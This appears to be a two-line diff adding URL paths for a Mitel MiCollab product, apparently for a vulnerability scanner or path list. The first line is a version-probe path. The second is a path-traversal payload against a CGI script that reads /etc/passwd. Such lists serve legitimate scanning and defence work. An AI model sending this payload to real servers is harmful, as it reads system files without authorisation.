@@ -1,0 +1,2 @@
+/ucs/micollab/version.json
+/awcuser/cgi-bin/vcs_access_file.cgi?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd
